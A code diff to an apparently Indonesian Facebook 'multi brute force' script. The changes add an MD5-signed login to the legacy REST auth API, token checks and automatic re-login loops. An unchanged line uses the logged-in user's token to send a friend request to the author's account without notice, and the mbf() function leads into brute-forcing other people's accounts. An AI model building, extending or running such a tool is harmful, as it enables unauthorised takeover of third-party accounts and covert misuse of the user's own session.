@@ -27,6 +27,7 @@ br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
+id = []
 count = 0
 id_koncomu = []
 dados = []
@@ -44,6 +45,7 @@ def login():
             br.open('https://m.facebook.com')
         except mechanize.URLError:
             print m+" [ Tidak ada koneksi.. ]"
+        br._factory.is_html = True
         br.select_form(nr=0)
         br.form['email'] = user
         br.form['pass'] = passw
@@ -53,7 +55,10 @@ def login():
             try:
                 dev = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + user + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + passw + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                 data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': user, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': passw, 'return_ssl_resources': '0', 'v': '1.0'}
-                data.update({'dev': a})
+                iv = hashlib.new("md5")
+                iv.update(dev)
+                van = iv.hexdigest()
+                data.update({'dev': van})
                 url = 'https://api.facebook.com/restserver.php'
                 req = requests.get(url, params=data)
                 jsl = json.loads(req.text)
@@ -63,21 +68,46 @@ def login():
                 print h+" Berhasil Login...."
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+jsl['access_token'])
                 
-                id_konco()
+                akun()
                 
             except KeyError:
                 print m+" [ Terjadi Kesalahan.. ]"
         if 'checkpoint' in url:
             print m+" Akun Kena Cekpoint.."
+            os.system("rm -f token.txt")
+            login()
 
         else:
             print m+" Gagal Login..."
-
+            os.system("rm -f token.txt")
+            login()
+            
+def akun():
+    try:
+        token = open("token.txt", "r").read()
+    except IOError:
+        print m+" Token Tidak ada..."
+        os.system("rm -f token.txt")
+        login()
+    else:
+        try:
+            url = requests.get("https://graph.facebook.com/me?access_token=" + token )
+            jsl = json.loads(url.text)
+            jeneng = jsl['name']
+            id = jsl['id']
+        except KeyError:
+            print m+" Akun Kena Cekpoint..."
+            os.system("rm -f token.txt")
+            login()
+         
+    id_konco()
+    
 def id_konco():
     try:
         token = open('token.txt', 'r').read()
     except IOError:
         print m+" Tidak ada Token "
+        os.system("rm -f token.txt")
         login()
     else:
         try:
@@ -103,6 +133,7 @@ def mbf():
         token = open('token.txt', 'r')
     except IOError:
         print m+" Token Tidak Ditemukan.."
+        os.system("rm -f token.txt")
         login()
     else:
         print h+" Multi Brute Force."
